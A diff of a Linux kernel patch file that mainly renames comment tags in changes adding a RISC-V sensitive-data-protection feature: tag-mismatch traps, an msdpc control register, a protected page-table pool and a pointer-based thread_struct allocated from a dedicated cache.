@@ -1453,7 +1453,7 @@ index 000000000000..19879ba9321c
 +}
 \ No newline at end of file
 diff --git a/arch/arm/kernel/spectre.c b/arch/arm/kernel/spectre.c
-index 0dcefc36fb7a..d47c8b3b56f0 100644
+index 0dcefc36fb7a..6643ae9617d8 100644
 --- a/arch/arm/kernel/spectre.c
 +++ b/arch/arm/kernel/spectre.c
 @@ -8,7 +8,8 @@
@@ -1461,13 +1461,13 @@ index 0dcefc36fb7a..d47c8b3b56f0 100644
  {
  #ifdef CONFIG_BPF_SYSCALL
 -	return !sysctl_unprivileged_bpf_disabled;
-+	// FZY: Adjust the reference of sysctl_unprivileged_bpf_disabled
++	// SDP: Adjust the reference of sysctl_unprivileged_bpf_disabled
 +	return !*sysctl_unprivileged_bpf_disabled_ptr;
  #else
  	return false;
  #endif
 diff --git a/arch/arm64/kernel/proton-pack.c b/arch/arm64/kernel/proton-pack.c
-index 05f40c4e18fd..c5d2bc54f153 100644
+index 05f40c4e18fd..86b25447f5ab 100644
 --- a/arch/arm64/kernel/proton-pack.c
 +++ b/arch/arm64/kernel/proton-pack.c
 @@ -115,7 +115,8 @@ static const char *get_bhb_affected_string(enum mitigation_state bhb_state)
@@ -1475,20 +1475,20 @@ index 05f40c4e18fd..c5d2bc54f153 100644
  {
  #ifdef CONFIG_BPF_SYSCALL
 -	return !sysctl_unprivileged_bpf_disabled;
-+	// FZY: Adjust the reference of sysctl_unprivileged_bpf_disabled
++	// SDP: Adjust the reference of sysctl_unprivileged_bpf_disabled
 +	return !*sysctl_unprivileged_bpf_disabled_ptr;
  #else
  	return false;
  #endif
 diff --git a/arch/riscv/include/asm/asm-prototypes.h b/arch/riscv/include/asm/asm-prototypes.h
-index 61ba8ed43d8f..4c2d5584d93e 100644
+index 61ba8ed43d8f..4be835eb6212 100644
 --- a/arch/riscv/include/asm/asm-prototypes.h
 +++ b/arch/riscv/include/asm/asm-prototypes.h
 @@ -25,6 +25,10 @@ DECLARE_DO_ERROR_INFO(do_trap_ecall_s);
  DECLARE_DO_ERROR_INFO(do_trap_ecall_m);
  DECLARE_DO_ERROR_INFO(do_trap_break);
  
-+// FZY: SDP tag mismatch handlers
++// SDP: Tag mismatch handlers
 +DECLARE_DO_ERROR_INFO(do_trap_sdp_stag);
 +DECLARE_DO_ERROR_INFO(do_trap_sdp_ttag);
 +
@@ -1496,14 +1496,14 @@ index 61ba8ed43d8f..4c2d5584d93e 100644
  asmlinkage void handle_bad_stack(struct pt_regs *regs);
  asmlinkage void do_page_fault(struct pt_regs *regs);
 diff --git a/arch/riscv/include/asm/csr.h b/arch/riscv/include/asm/csr.h
-index 777cb8299551..411a29a84fe0 100644
+index 777cb8299551..56bd309d05f3 100644
 --- a/arch/riscv/include/asm/csr.h
 +++ b/arch/riscv/include/asm/csr.h
 @@ -107,6 +107,10 @@
  #define EXC_VIRTUAL_INST_FAULT		22
  #define EXC_STORE_GUEST_PAGE_FAULT	23
  
-+// FZY: SDP tag mismatch causes, raised when msdpc enforcing mode is on
++// SDP: Tag mismatch causes, raised when msdpc enforcing mode is on
 +#define EXC_SDP_STAG_MISMATCH		24
 +#define EXC_SDP_TTAG_MISMATCH		25
 +
@@ -1514,14 +1514,14 @@ index 777cb8299551..411a29a84fe0 100644
  #define CSR_SIP			0x144
  #define CSR_SATP		0x180
  
-+// FZY: Define msdpc csr to enable/disable sensitive data protection.
++// SDP: Define msdpc csr to enable/disable sensitive data protection.
 +// Bit 0 enables the checks, bit 16 selects enforcing mode (trap on mismatch)
 +// instead of permissive mode (QEMU only logs the mismatch)
 +#define CSR_MSDPC		0x188
 +#define MSDPC_ENABLE		0x1
 +#define MSDPC_ENFORCING		0x10000
 +
-+// FZY: Define SDP_ENABLE_CHECKS
++// SDP: Define SDP_ENABLE_CHECKS
 +#if defined(SDP_SD) || defined(SDP_FP) || defined(SDP_RET)
 +#define SDP_ENABLE_CHECKS	1
 +#endif
@@ -1529,14 +1529,13 @@ index 777cb8299551..411a29a84fe0 100644
  #define CSR_STIMECMP		0x14D
  #define CSR_STIMECMPH		0x15D
  
-@@ -513,6 +529,21 @@
+@@ -513,6 +529,20 @@
  			      : "memory");			\
  })
  
-+// FZY: Turn on the sdp checks. Build with -DSDP_ENFORCING to trap on a tag
-+// mismatch instead of only logging it in QEMU (permissive mode). Writing msdpc
-+// also makes QEMU delegate the SDP causes to S-mode, so this has to run before
-+// any tagged access can mismatch
++// SDP: Turn on the SDP checks; -DSDP_ENFORCING traps on a mismatch instead of
++// logging it (permissive). Writing msdpc also delegates the SDP causes to S-mode,
++// so it must run before any tagged access can mismatch
 +#ifdef SDP_ENABLE_CHECKS
 +static inline void arch_sdp_enable(void)
 +{
@@ -1552,7 +1551,7 @@ index 777cb8299551..411a29a84fe0 100644
  
  #endif /* _ASM_RISCV_CSR_H */
 diff --git a/arch/riscv/include/asm/pgalloc.h b/arch/riscv/include/asm/pgalloc.h
-index d169a4f41a2e..0607cb3c6e4b 100644
+index d169a4f41a2e..ecb3428b25e4 100644
 --- a/arch/riscv/include/asm/pgalloc.h
 +++ b/arch/riscv/include/asm/pgalloc.h
 @@ -18,7 +18,8 @@
@@ -1560,7 +1559,7 @@ index d169a4f41a2e..0607cb3c6e4b 100644
  	pmd_t *pmd, pte_t *pte)
  {
 -	unsigned long pfn = virt_to_pfn(pte);
-+	// FZY: The child table may live in the sdp page table pool
++	// SDP: The child table may live in the sdp page table pool
 +	unsigned long pfn = sdp_pt_virt_to_pfn(pte);
  
  	set_pmd(pmd, __pmd((pfn << _PAGE_PFN_SHIFT) | _PAGE_TABLE));
@@ -1570,7 +1569,7 @@ index d169a4f41a2e..0607cb3c6e4b 100644
  	pmd_t *pmd, pgtable_t pte)
  {
 -	unsigned long pfn = virt_to_pfn(page_address(pte));
-+	// FZY: Use the page directly, page_address() is wrong for sdp pool pages
++	// SDP: Use the page directly, page_address() is wrong for sdp pool pages
 +	unsigned long pfn = page_to_pfn(pte);
  
  	set_pmd(pmd, __pmd((pfn << _PAGE_PFN_SHIFT) | _PAGE_TABLE));
@@ -1580,7 +1579,7 @@ index d169a4f41a2e..0607cb3c6e4b 100644
  static inline void pud_populate(struct mm_struct *mm, pud_t *pud, pmd_t *pmd)
  {
 -	unsigned long pfn = virt_to_pfn(pmd);
-+	// FZY: The child table may live in the sdp page table pool
++	// SDP: The child table may live in the sdp page table pool
 +	unsigned long pfn = sdp_pt_virt_to_pfn(pmd);
  
  	set_pud(pud, __pud((pfn << _PAGE_PFN_SHIFT) | _PAGE_TABLE));
@@ -1590,7 +1589,7 @@ index d169a4f41a2e..0607cb3c6e4b 100644
  {
  	if (pgtable_l4_enabled) {
 -		unsigned long pfn = virt_to_pfn(pud);
-+		// FZY: The child table may live in the sdp page table pool
++		// SDP: The child table may live in the sdp page table pool
 +		unsigned long pfn = sdp_pt_virt_to_pfn(pud);
  
  		set_p4d(p4d, __p4d((pfn << _PAGE_PFN_SHIFT) | _PAGE_TABLE));
@@ -1600,7 +1599,7 @@ index d169a4f41a2e..0607cb3c6e4b 100644
  {
  	if (pgtable_l4_enabled) {
 -		unsigned long pfn = virt_to_pfn(pud);
-+		// FZY: The child table may live in the sdp page table pool
++		// SDP: The child table may live in the sdp page table pool
 +		unsigned long pfn = sdp_pt_virt_to_pfn(pud);
  
  		set_p4d_safe(p4d,
@@ -1610,7 +1609,7 @@ index d169a4f41a2e..0607cb3c6e4b 100644
  {
  	if (pgtable_l5_enabled) {
 -		unsigned long pfn = virt_to_pfn(p4d);
-+		// FZY: The child table may live in the sdp page table pool
++		// SDP: The child table may live in the sdp page table pool
 +		unsigned long pfn = sdp_pt_virt_to_pfn(p4d);
  
  		set_pgd(pgd, __pgd((pfn << _PAGE_PFN_SHIFT) | _PAGE_TABLE));
@@ -1620,7 +1619,7 @@ index d169a4f41a2e..0607cb3c6e4b 100644
  {
  	if (pgtable_l5_enabled) {
 -		unsigned long pfn = virt_to_pfn(p4d);
-+		// FZY: The child table may live in the sdp page table pool
++		// SDP: The child table may live in the sdp page table pool
 +		unsigned long pfn = sdp_pt_virt_to_pfn(p4d);
  
  		set_pgd_safe(pgd,
@@ -1631,7 +1630,7 @@ index d169a4f41a2e..0607cb3c6e4b 100644
  			gfp = GFP_PGTABLE_KERNEL;
 -		return (p4d_t *)get_zeroed_page(gfp);
 +
-+		// FZY: Go through pagetable_alloc() so that the p4d comes from the
++		// SDP: Go through pagetable_alloc() so that the p4d comes from the
 +		// sdp page table pool
 +		struct ptdesc *ptdesc;
 +		ptdesc = pagetable_alloc(gfp, 0);
@@ -1645,7 +1644,7 @@ index d169a4f41a2e..0607cb3c6e4b 100644
  	BUG_ON((unsigned long)p4d & (PAGE_SIZE-1));
 -	free_page((unsigned long)p4d);
 +
-+	// FZY: Go through pagetable_free() so that sdp pool pages go back to the pool
++	// SDP: Go through pagetable_free() so that sdp pool pages go back to the pool
 +	pagetable_free(virt_to_ptdesc(p4d));
  }
  
@@ -1660,7 +1659,7 @@ index d169a4f41a2e..0607cb3c6e4b 100644
 -		/* Copy kernel mappings */
 -		sync_kernel_mappings(pgd);
 -	}
-+	// FZY: Go through pagetable_alloc() so that the pgd comes from the sdp
++	// SDP: Go through pagetable_alloc() so that the pgd comes from the sdp
 +	// page table pool. The memset and the copy below cover the whole page,
 +	// so the buddy fallback does not need __GFP_ZERO either
 +	struct ptdesc *ptdesc = pagetable_alloc(GFP_KERNEL, 0);
@@ -1685,14 +1684,14 @@ index d169a4f41a2e..0607cb3c6e4b 100644
 -	pagetable_pte_dtor(page_ptdesc(pte));		\
 -	tlb_remove_page_ptdesc((tlb), page_ptdesc(pte));\
 -} while (0)
-+// FZY: Free the pte page immediately instead of through the mmu_gather batch,
++// SDP: Free the pte page immediately instead of through the mmu_gather batch,
 +// which would hand sdp pool pages back to the buddy allocator
 +#define __pte_free_tlb(tlb, pte, buf)	pte_free((tlb)->mm, pte)
  #endif /* CONFIG_MMU */
  
  #endif /* _ASM_RISCV_PGALLOC_H */
 diff --git a/arch/riscv/include/asm/pgtable-64.h b/arch/riscv/include/asm/pgtable-64.h
-index 7a5097202e15..de6a2dad1775 100644
+index 7a5097202e15..60f0105aa102 100644
 --- a/arch/riscv/include/asm/pgtable-64.h
 +++ b/arch/riscv/include/asm/pgtable-64.h
 @@ -43,6 +43,28 @@ extern bool pgtable_l5_enabled;
@@ -1700,8 +1699,8 @@ index 7a5097202e15..de6a2dad1775 100644
  #define PMD_MASK        (~(PMD_SIZE - 1))
  
 +#ifdef CONFIG_SDP_PGTABLE
-+// FZY: Address conversion for pool page tables, plain arithmetic on the
-+// __tag1 pool base. Defined here because virt_to_pfn() needs PGDIR_SIZE.
++// SDP: Address conversion for pool page tables, plain arithmetic on the
++// __tag1 pool base. Defined here because virt_to_pfn() needs PGDIR_SIZE
 +static inline unsigned long sdp_pt_virt_to_pfn(const void *va)
 +{
 +	if (sdp_pt_is_pool_va(va))
@@ -1719,7 +1718,7 @@ index 7a5097202e15..de6a2dad1775 100644
 +
 +	return (void *)pfn_to_virt(pfn);
 +}
-+#endif /* CONFIG_SDP_PGTABLE */
++#endif // CONFIG_SDP_PGTABLE
 +
  /* Page 4th Directory entry */
  typedef struct {
@@ -1729,7 +1728,7 @@ index 7a5097202e15..de6a2dad1775 100644
  static inline pmd_t *pud_pgtable(pud_t pud)
  {
 -	return (pmd_t *)pfn_to_virt(__page_val_to_pfn(pud_val(pud)));
-+	// FZY: The pmd page may live in the sdp page table pool
++	// SDP: The pmd page may live in the sdp page table pool
 +	return (pmd_t *)sdp_pt_pfn_to_virt(__page_val_to_pfn(pud_val(pud)));
  }
  
@@ -1738,7 +1737,7 @@ index 7a5097202e15..de6a2dad1775 100644
  
  static inline pud_t *p4d_pgtable(p4d_t p4d)
  {
-+	// FZY: The pud page may live in the sdp page table pool
++	// SDP: The pud page may live in the sdp page table pool
  	if (pgtable_l4_enabled)
 -		return (pud_t *)pfn_to_virt(__page_val_to_pfn(p4d_val(p4d)));
 +		return (pud_t *)sdp_pt_pfn_to_virt(__page_val_to_pfn(p4d_val(p4d)));
@@ -1749,7 +1748,7 @@ index 7a5097202e15..de6a2dad1775 100644
  
  static inline p4d_t *pgd_pgtable(pgd_t pgd)
  {
-+	// FZY: The p4d page may live in the sdp page table pool
++	// SDP: The p4d page may live in the sdp page table pool
  	if (pgtable_l5_enabled)
 -		return (p4d_t *)pfn_to_virt(__page_val_to_pfn(pgd_val(pgd)));
 +		return (p4d_t *)sdp_pt_pfn_to_virt(__page_val_to_pfn(pgd_val(pgd)));
@@ -1757,18 +1756,18 @@ index 7a5097202e15..de6a2dad1775 100644
  	return (p4d_t *)p4d_pgtable((p4d_t) { pgd_val(pgd) });
  }
 diff --git a/arch/riscv/include/asm/pgtable.h b/arch/riscv/include/asm/pgtable.h
-index b2ba3f79cfe9..ab8fc4ad3a82 100644
+index b2ba3f79cfe9..84cd9f57465c 100644
 --- a/arch/riscv/include/asm/pgtable.h
 +++ b/arch/riscv/include/asm/pgtable.h
 @@ -118,6 +118,16 @@
  #include <linux/mm_types.h>
  #include <asm/compat.h>
  
-+// FZY: Include for the sdp page table pool
++// SDP: Include for the sdp page table pool
 +#include <linux/sdp_pgtable.h>
 +
 +#ifdef CONFIG_SDP_PGTABLE
-+// FZY: Defined in arch/riscv/mm/init.c, repointed into the pool by
++// SDP: Defined in arch/riscv/mm/init.c, repointed into the pool by
 +// sdp_pt_switch() in arch/riscv/mm/sdp_pgtable.c once the kernel page tables
 +// have been migrated
 +extern pte_t *__sdp_tag1 fixmap_pte_ptr;
@@ -1782,20 +1781,20 @@ index b2ba3f79cfe9..ab8fc4ad3a82 100644
  static inline unsigned long pmd_page_vaddr(pmd_t pmd)
  {
 -	return (unsigned long)pfn_to_virt(__page_val_to_pfn(pmd_val(pmd)));
-+	// FZY: The pte page may live in the sdp page table pool
++	// SDP: The pte page may live in the sdp page table pool
 +	return (unsigned long)sdp_pt_pfn_to_virt(__page_val_to_pfn(pmd_val(pmd)));
  }
  
  static inline pte_t pmd_pte(pmd_t pmd)
 diff --git a/arch/riscv/include/asm/processor.h b/arch/riscv/include/asm/processor.h
-index 3e23e1786d05..37201e4c21da 100644
+index 3e23e1786d05..dc38e4292959 100644
 --- a/arch/riscv/include/asm/processor.h
 +++ b/arch/riscv/include/asm/processor.h
 @@ -92,9 +92,15 @@ static inline void arch_thread_struct_whitelist(unsigned long *offset,
  	*size = sizeof_field(struct thread_struct, fstate);
  }
  
-+// FZY: Protect task_struct.thread_struct by allocating it in sdp_cache and storing its pointer in task_struct
++// SDP: Protect task_struct.thread_struct by allocating it in sdp_cache and storing its pointer in task_struct
 +#ifdef CONFIG_SDP_CACHE
 +extern struct thread_struct __boot_init_thread;
 +#define INIT_THREAD (&__boot_init_thread)
@@ -1808,7 +1807,7 @@ index 3e23e1786d05..37201e4c21da 100644
  #define task_pt_regs(tsk)						\
  	((struct pt_regs *)(task_stack_page(tsk) + THREAD_SIZE		\
 diff --git a/arch/riscv/include/asm/vector.h b/arch/riscv/include/asm/vector.h
-index c5ee07b3df07..5151858a2762 100644
+index c5ee07b3df07..d79c258d4d79 100644
 --- a/arch/riscv/include/asm/vector.h
 +++ b/arch/riscv/include/asm/vector.h
 @@ -166,7 +166,9 @@ static inline void riscv_v_vstate_save(struct task_struct *task,
@@ -1817,7 +1816,7 @@ index c5ee07b3df07..5151858a2762 100644
  	if ((regs->status & SR_VS) == SR_VS_DIRTY) {
 -		struct __riscv_v_ext_state *vstate = &task->thread.vstate;
 +
-+		// FZY: Access task_struct.thread via task_thread_ptr() 
++		// SDP: Access task_struct.thread via task_thread_ptr()
 +		struct __riscv_v_ext_state *vstate = &task_thread_ptr(task)->vstate;
  
  		__riscv_v_vstate_save(vstate, vstate->datap);
@@ -1828,20 +1827,20 @@ index c5ee07b3df07..5151858a2762 100644
  	if ((regs->status & SR_VS) != SR_VS_OFF) {
 -		struct __riscv_v_ext_state *vstate = &task->thread.vstate;
 +
-+		// FZY: Access task_struct.thread via task_thread_ptr() 
++		// SDP: Access task_struct.thread via task_thread_ptr()
 +		struct __riscv_v_ext_state *vstate = &task_thread_ptr(task)->vstate;
  
  		__riscv_v_vstate_restore(vstate, vstate->datap);
  		__riscv_v_vstate_clean(regs);
 diff --git a/arch/riscv/kernel/asm-offsets.c b/arch/riscv/kernel/asm-offsets.c
-index d6a75aac1d27..c2f555e78f44 100644
+index d6a75aac1d27..910b8907077e 100644
 --- a/arch/riscv/kernel/asm-offsets.c
 +++ b/arch/riscv/kernel/asm-offsets.c
 @@ -20,6 +20,24 @@ void asm_offsets(void);
  
  void asm_offsets(void)
  {
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +#ifdef CONFIG_SDP_CACHE
 +	OFFSET(TASK_THREAD_PTR, task_struct, thread);
 +	OFFSET(THREAD_RA, thread_struct, ra);
@@ -1873,7 +1872,7 @@ index d6a75aac1d27..c2f555e78f44 100644
  	OFFSET(TASK_TI_KERNEL_SP, task_struct, thread_info.kernel_sp);
  	OFFSET(TASK_TI_USER_SP, task_struct, thread_info.user_sp);
  
-+	// FZY: thread is now a pointer, so FPU offsets are relative to thread_struct
++	// SDP: thread is now a pointer, so FPU offsets are relative to thread_struct
 +#ifdef CONFIG_SDP_CACHE
 +	OFFSET(THREAD_F0,  thread_struct, fstate.f[0]);
 +	OFFSET(THREAD_F1,  thread_struct, fstate.f[1]);
@@ -1926,9 +1925,9 @@ index d6a75aac1d27..c2f555e78f44 100644
  	 * to loading the long immediate every time.
  	 */
 +	
-+	// FZY: When thread is a pointer, offsets are within thread_struct (small),
++	// SDP: When thread is a pointer, offsets are within thread_struct (small),
 +	// so no relative offset trick is needed for callee-saved regs.
-+	// FPU relative offsets (_F0) are still needed for fpu.S in both paths.
++	// FPU relative offsets (_F0) are still needed for fpu.S in both paths
 +#ifdef CONFIG_SDP_CACHE
 +	DEFINE(TASK_THREAD_F0_F0,
 +		  offsetof(struct thread_struct, fstate.f[0])
@@ -2075,7 +2074,7 @@ index d6a75aac1d27..c2f555e78f44 100644
  	/*
  	 * We allocate a pt_regs on the stack when entering the kernel.  This
 diff --git a/arch/riscv/kernel/compat_signal.c b/arch/riscv/kernel/compat_signal.c
-index 6ec4e34255a9..415707e12d6d 100644
+index 6ec4e34255a9..6e6b015d6fa9 100644
 --- a/arch/riscv/kernel/compat_signal.c
 +++ b/arch/riscv/kernel/compat_signal.c
 @@ -53,7 +53,9 @@ static long compat_restore_fp_state(struct pt_regs *regs,
@@ -2083,7 +2082,7 @@ index 6ec4e34255a9..415707e12d6d 100644
  	size_t i;
  
 -	err = __copy_from_user(&current->thread.fstate, state, sizeof(*state));
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	err = __copy_from_user(&task_thread_ptr(current)->fstate, state, sizeof(*state));
 +
  	if (unlikely(err))
@@ -2095,14 +2094,14 @@ index 6ec4e34255a9..415707e12d6d 100644
  	fstate_save(current, regs);
 -	err = __copy_to_user(state, &current->thread.fstate, sizeof(*state));
 +
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	err = __copy_to_user(state, &task_thread_ptr(current)->fstate, sizeof(*state));
 +
  	if (unlikely(err))
  		return err;
  
 diff --git a/arch/riscv/kernel/entry.S b/arch/riscv/kernel/entry.S
-index 143a2bb3e697..7a269c1cf890 100644
+index 143a2bb3e697..b7e47497accc 100644
 --- a/arch/riscv/kernel/entry.S
 +++ b/arch/riscv/kernel/entry.S
 @@ -279,6 +279,48 @@ SYM_CODE_END(ret_from_fork)
@@ -2110,7 +2109,7 @@ index 143a2bb3e697..7a269c1cf890 100644
   */
  SYM_FUNC_START(__switch_to)
 +
-+// FZY: Access task_struct.thread via task_thread_ptr()
++// SDP: Access task_struct.thread via task_thread_ptr()
 +#ifdef CONFIG_SDP_CACHE
 +	// thread is a pointer in task_struct, load prev->thread/next->thread
 +	li    a2, TASK_THREAD_PTR
@@ -2168,7 +2167,7 @@ index 143a2bb3e697..7a269c1cf890 100644
  	RISCV_PTR do_trap_unknown
  	RISCV_PTR do_page_fault   /* store page fault */
 +
-+	// FZY: 16..23 are reserved or H-extension causes, 24/25 are the SDP traps
++	// SDP: 16..23 are reserved or H-extension causes, 24/25 are the SDP traps
 +	RISCV_PTR do_trap_unknown
 +	RISCV_PTR do_trap_unknown
 +	RISCV_PTR do_trap_unknown
@@ -2184,7 +2183,7 @@ index 143a2bb3e697..7a269c1cf890 100644
  SYM_CODE_END(excp_vect_table)
  
 diff --git a/arch/riscv/kernel/fpu.S b/arch/riscv/kernel/fpu.S
-index dd2205473de7..16a96d8f80f9 100644
+index dd2205473de7..3ae29f89c6f1 100644
 --- a/arch/riscv/kernel/fpu.S
 +++ b/arch/riscv/kernel/fpu.S
 @@ -20,8 +20,23 @@
@@ -2192,10 +2191,10 @@ index dd2205473de7..16a96d8f80f9 100644
  
  ENTRY(__fstate_save)
 +
-+// FZY: Access task_struct.thread via task_thread_ptr()
++// SDP: Access task_struct.thread via task_thread_ptr()
 +#ifdef CONFIG_SDP_CACHE
 +
-+	// FZY: thread is a pointer, load it and point to fstate
++	// SDP: thread is a pointer, load it and point to fstate
 +	li   a2, TASK_THREAD_PTR
 +	add  a0, a0, a2
 +	ld_sdp_110 a0, -1334(a0)
@@ -2216,9 +2215,9 @@ index dd2205473de7..16a96d8f80f9 100644
  
  ENTRY(__fstate_restore)
 +
-+// FZY: Access task_struct.thread via task_thread_ptr()
++// SDP: Access task_struct.thread via task_thread_ptr()
 +#ifdef CONFIG_SDP_CACHE
-+	// FZY: thread is a pointer, load it and point to fstate
++	// SDP: thread is a pointer, load it and point to fstate
 +	// REG_L a0, TASK_THREAD_PTR(a0)
 +	li   a2, TASK_THREAD_PTR
 +	add  a0, a0, a2
@@ -2235,7 +2234,7 @@ index dd2205473de7..16a96d8f80f9 100644
  	lw t0, TASK_THREAD_FCSR_F0(a0)
  	csrs CSR_STATUS, t1
 diff --git a/arch/riscv/kernel/kgdb.c b/arch/riscv/kernel/kgdb.c
-index 2e0266ae6bd7..d62c9ae1fddd 100644
+index 2e0266ae6bd7..ce05944ea0f7 100644
 --- a/arch/riscv/kernel/kgdb.c
 +++ b/arch/riscv/kernel/kgdb.c
 @@ -234,19 +234,20 @@ sleeping_thread_to_gdb_regs(unsigned long *gdb_regs, struct task_struct *task)
@@ -2255,7 +2254,7 @@ index 2e0266ae6bd7..d62c9ae1fddd 100644
 -	gdb_regs[DBG_REG_S9_OFF] = task->thread.s[10];
 -	gdb_regs[DBG_REG_S10_OFF] = task->thread.s[11];
 -	gdb_regs[DBG_REG_EPC_OFF] = task->thread.ra;
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	gdb_regs[DBG_REG_SP_OFF] = task_thread_ptr(task)->sp;
 +	gdb_regs[DBG_REG_FP_OFF] = task_thread_ptr(task)->s[0];
 +	gdb_regs[DBG_REG_S1_OFF] = task_thread_ptr(task)->s[1];
@@ -2273,7 +2272,7 @@ index 2e0266ae6bd7..d62c9ae1fddd 100644
  
  void kgdb_arch_set_pc(struct pt_regs *regs, unsigned long pc)
 diff --git a/arch/riscv/kernel/probes/uprobes.c b/arch/riscv/kernel/probes/uprobes.c
-index 194f166b2cc4..fadbfed86d71 100644
+index 194f166b2cc4..118e68ec02ee 100644
 --- a/arch/riscv/kernel/probes/uprobes.c
 +++ b/arch/riscv/kernel/probes/uprobes.c
 @@ -54,8 +54,9 @@ int arch_uprobe_pre_xol(struct arch_uprobe *auprobe, struct pt_regs *regs)
@@ -2282,7 +2281,7 @@ index 194f166b2cc4..fadbfed86d71 100644
  
 -	utask->autask.saved_cause = current->thread.bad_cause;
 -	current->thread.bad_cause = UPROBE_TRAP_NR;
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	utask->autask.saved_cause = task_thread_ptr(current)->bad_cause;
 +	task_thread_ptr(current)->bad_cause = UPROBE_TRAP_NR;
  
@@ -2294,7 +2293,7 @@ index 194f166b2cc4..fadbfed86d71 100644
  
 -	WARN_ON_ONCE(current->thread.bad_cause != UPROBE_TRAP_NR);
 -	current->thread.bad_cause = utask->autask.saved_cause;
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	WARN_ON_ONCE(task_thread_ptr(current)->bad_cause != UPROBE_TRAP_NR);
 +	task_thread_ptr(current)->bad_cause = utask->autask.saved_cause;
  
@@ -2305,7 +2304,7 @@ index 194f166b2cc4..fadbfed86d71 100644
  bool arch_uprobe_xol_was_trapped(struct task_struct *t)
  {
 -	if (t->thread.bad_cause != UPROBE_TRAP_NR)
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	if (task_thread_ptr(t)->bad_cause != UPROBE_TRAP_NR)
  		return true;
  
@@ -2315,27 +2314,27 @@ index 194f166b2cc4..fadbfed86d71 100644
  	struct uprobe_task *utask = current->utask;
  
 -	current->thread.bad_cause = utask->autask.saved_cause;
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	task_thread_ptr(current)->bad_cause = utask->autask.saved_cause;
  	/*
  	 * Task has received a fatal signal, so reset back to probbed
  	 * address.
 diff --git a/arch/riscv/kernel/process.c b/arch/riscv/kernel/process.c
-index e32d737e039f..bd8c64b06227 100644
+index e32d737e039f..0b97989df185 100644
 --- a/arch/riscv/kernel/process.c
 +++ b/arch/riscv/kernel/process.c
 @@ -26,8 +26,63 @@
  #include <asm/cpuidle.h>
  #include <asm/vector.h>
  
-+// FZY: Include sdp_cache.h for thread_struct protection
++// SDP: Include sdp_cache.h for thread_struct protection
 +#ifdef CONFIG_SDP_CACHE
 +#include <linux/sdp_cache.h>
 +#endif
 +
  register unsigned long gp_in_global __asm__("gp");
  
-+// FZY: Boot-time thread_struct for init_task, and sdp_cache for runtime allocation
++// SDP: Boot-time thread_struct for init_task, and sdp_cache for runtime allocation
 +#ifdef CONFIG_SDP_CACHE
 +struct thread_struct __boot_init_thread = {
 +	.sp = sizeof(init_stack) + (long)&init_stack,
@@ -2394,7 +2393,7 @@ index e32d737e039f..bd8c64b06227 100644
  	fstate_off(current, task_pt_regs(current));
 -	memset(&current->thread.fstate, 0, sizeof(current->thread.fstate));
 +
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	memset(&task_thread_ptr(current)->fstate, 0, sizeof(task_thread_ptr(current)->fstate));
 +
  #endif
@@ -2405,7 +2404,7 @@ index e32d737e039f..bd8c64b06227 100644
 -	kfree(current->thread.vstate.datap);
 -	memset(&current->thread.vstate, 0, sizeof(struct __riscv_v_ext_state));
 +
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	kfree(task_thread_ptr(current)->vstate.datap);
 +	memset(&task_thread_ptr(current)->vstate, 0, sizeof(struct __riscv_v_ext_state));
  #endif
@@ -2414,12 +2413,12 @@ index e32d737e039f..bd8c64b06227 100644
  void arch_release_task_struct(struct task_struct *tsk)
  {
  	/* Free the vector context of datap. */
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
  	if (has_vector())
 -		kfree(tsk->thread.vstate.datap);
 +		kfree(task_thread_ptr(tsk)->vstate.datap);
 +
-+// FZY: Free thread_struct from sdp_cache
++// SDP: Free thread_struct from sdp_cache
 +#ifdef CONFIG_SDP_CACHE	
 +	if (thread_sdp_cache)
 +		thread_struct_free(task_thread_ptr(tsk));
@@ -2432,7 +2431,7 @@ index e32d737e039f..bd8c64b06227 100644
 +
  	*dst = *src;
 +
-+	// FZY: Update thread
++	// SDP: Update thread
 +	if (unlikely(!thread_sdp_cache))
 +		return -ENOMEM;
 +
@@ -2444,7 +2443,7 @@ index e32d737e039f..bd8c64b06227 100644
 +
  	/* clear entire V context, including datap for a new task */
 -	memset(&dst->thread.vstate, 0, sizeof(struct __riscv_v_ext_state));
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	memset(&task_thread_ptr(dst)->vstate, 0, sizeof(struct __riscv_v_ext_state));
  
  	return 0;
@@ -2454,7 +2453,7 @@ index e32d737e039f..bd8c64b06227 100644
  	struct pt_regs *childregs = task_pt_regs(p);
  
 -	memset(&p->thread.s, 0, sizeof(p->thread.s));
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	memset(&task_thread_ptr(p)->s, 0, sizeof(task_thread_ptr(p)->s));
  
  	/* p->thread holds context to be restored by __switch_to() */
@@ -2465,7 +2464,7 @@ index e32d737e039f..bd8c64b06227 100644
  
 -		p->thread.s[0] = (unsigned long)args->fn;
 -		p->thread.s[1] = (unsigned long)args->fn_arg;
-+		// FZY: Access task_struct.thread via task_thread_ptr()
++		// SDP: Access task_struct.thread via task_thread_ptr()
 +		task_thread_ptr(p)->s[0] = (unsigned long)args->fn;
 +		task_thread_ptr(p)->s[1] = (unsigned long)args->fn_arg;
  	} else {
@@ -2477,19 +2476,19 @@ index e32d737e039f..bd8c64b06227 100644
  		childregs->a0 = 0; /* Return value of fork() */
 -		p->thread.s[0] = 0;
 +
-+		// FZY: Access task_struct.thread via task_thread_ptr()
++		// SDP: Access task_struct.thread via task_thread_ptr()
 +		task_thread_ptr(p)->s[0] = 0;
  	}
